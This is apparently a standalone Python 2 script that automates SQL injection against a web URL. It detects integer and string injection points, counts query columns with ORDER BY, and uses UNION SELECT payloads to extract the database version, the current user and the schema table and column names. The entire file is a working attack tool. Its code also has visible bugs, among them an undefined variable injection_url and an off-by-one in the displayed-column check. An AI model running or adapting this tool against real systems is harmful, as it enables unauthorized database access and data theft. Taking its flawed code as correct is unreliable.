#!/usr/bin/env python

import sys
import httplib2
import urllib
import re

marker = 'TEST'

def main():
    url = sys.argv[1]

    is_int_vuln = detect_integer(url)
    print "Vulnerable to Integer injection: " + str(is_int_vuln)

    is_string_vuln = detect_string(url)
    print "Vulnerable to String injection: " + str(is_string_vuln)

    injection_string ='1'

    if not is_string_vuln and not is_int_vuln:
        exit()
    elif is_string_vuln:
        injection_string = injection_url + "'"

    num_columns = detect_columns(url,injection_string)
    print "\n\nColumns in query: " + str(num_columns)

    disp_column = detect_printed_column(url,injection_string,num_columns)
    print "\n\nDisplayed column: " + str(disp_column)

    print "\n\nEXPLOITING:"
    print "Version: " + get_data(url,injection_string,num_columns,disp_column,['@@version'])
    print "Current User: " + get_data(url,injection_string,num_columns,disp_column,['current_user()'])
    print "Table Info: " + get_data(url,injection_string,num_columns,disp_column,['table_name','column_name'],from_statement='information_schema.columns')


def get_data(url,injection_string, num_columns, disp_column, data_q, from_statement = None):
    
    statement = injection_string + ' union select '

    for i in range(1,num_columns+1):
        if i == disp_column:
            data_tup_string = ''
            for t in data_q:
                data_tup_string = data_tup_string + t + ",':',"
            print data_tup_string
            statement = statement + "concat('ZZZ'," + data_tup_string + "'ZZZ'),"
        else:
            statement = statement + str(i) + ','

    statement = statement[:-1]

    if from_statement:
        statement = statement + ' from ' + from_statement

    resp = send_request_with_parameter(url, statement)
    result = re.search(r'ZZZ(.*)ZZZ', resp['data'])
    return result.group(1)


def detect_printed_column(url,injection_string,columns):

    statement = injection_string + ' union select '

    pl = []
    for i in range(1,columns+1):
        pl.append(str(i) * 5)

    for i in pl:
        statement = statement + i + ','
    statement = statement[:-1]

    resp = send_request_with_parameter(url,statement)

    display_col = None
    for i in range(1,len(pl)):
        if pl[i] in resp['data']:
            display_col = i+1
            break

    return display_col

def detect_columns(url,injection_string):

    for i in range(1,15):
        statement =  injection_string + ' order by ' + str(i)
        resp = send_request_with_parameter(url, statement)
        if 'Unknown column' in resp['data']:
            return i-1

    print "Cannot detect columns"
    exit()


def detect_integer(url):
    req = send_request_with_parameter(url,'1')
    if req['status']['status'] != '200' :
        print str(req['status'])
        exit()
    else:
        baseline = req['data']

        baseline2 = send_request_with_parameter(url,'2')
        check_1 = send_request_with_parameter(url,"2-1")
        check_2 = send_request_with_parameter(url,"2-0")
        check_3 = send_request_with_parameter(url,"1'")

        if check_1['data'] == baseline and check_2['data'] == baseline2['data']:
            return True
        elif check_3['data'] != baseline:
            return True
        else:
            return False



def detect_string(url):
    req = send_request_with_parameter(url,"1")
    baseline = req['data']

    check_1 = send_request_with_parameter(url,"1'") # should error
    check_2 = send_request_with_parameter(url,"1'--") # should not

    if check_1['data'] != baseline and check_2['data'] == baseline:
        return True
    else:
        return False

def send_request_with_parameter(url, param):

    split_url = url.split('/',1)

    h = httplib2.Http(".cache")

    rsp = h.request(url.replace(marker,urllib.quote_plus(param)),"GET")
    data = rsp[1]
    status = rsp[0]

    return {"status":status, "data":data}

if __name__ == "__main__": main()  